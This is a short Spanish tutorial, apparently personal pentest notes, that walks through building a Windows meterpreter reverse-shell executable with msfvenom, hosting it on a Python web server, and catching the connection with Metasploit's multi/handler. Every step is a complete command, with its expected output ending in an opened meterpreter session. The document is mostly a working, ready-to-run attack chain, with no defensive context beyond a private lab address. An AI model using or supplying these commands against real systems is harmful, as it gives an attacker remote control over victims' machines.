# Generar Payloads con Msfvenom

En este ejemplo, generaremos un archivo malicioso `.exe` para una máquina Windows utilizando `msfvenom`. El objetivo es recibir una reverse-shell con `meterpreter` a través de `Metasploit`.

### 1. Crear el archivo malicioso

Usamos `msfvenom` para crear un ejecutable malicioso que nos permitirá abrir una reverse-shell en la máquina objetivo.

```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.18 LPORT=1717 -f exe -o rs.exe
```

* **LHOST**: IP de nuestra máquina atacante.
* **LPORT**: Puerto que usaremos para la conexión de la reverse-shell.

**Salida esperada**:

```bash
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No arch selected, selecting arch: x64 from the payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: rs.exe
```

### 2. Montar un servidor web con Python

Usaremos un servidor web para transferir el payload al sistema Windows objetivo.

```bash
$ ls  
rs.exe  # Verificamos que el archivo ha sido creado.

$ python3 -m http.server 80  # Montamos el servidor en el puerto 80.
```

### 3. Configurar Metasploit para manejar la conexión

Abrimos `Metasploit` y configuramos el módulo `multi/handler` con los parámetros del payload.

```bash
$ msfconsole  # Iniciar Metasploit.

msf6 > use multi/handler  # Usar el módulo multi-handler.
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.18
msf6 exploit(multi/handler) > set LPORT 1717
msf6 exploit(multi/handler) > show options  # Verificar configuración.
```

### 4. Ejecutar el Handler y recibir la Reverse-Shell

```bash
msf6 exploit(multi/handler) > run  # Iniciar el handler.

[*] Started reverse TCP handler on 192.168.1.18:1717 
```

Una vez que se ejecute el archivo en la máquina Windows, `Metasploit` abrirá una sesión `meterpreter` y recibiremos la reverse-shell.

```bash
msf6 exploit(multi/handler) > run  # Iniciar el handler.

[*] Started reverse TCP handler on 192.168.1.18:1717 
[*] Sending stage (201798 bytes) to 192.168.1.25
[*] Meterpreter session 1 opened at 2024-10-09 01:47:00 +0200

meterpreter >
```

***
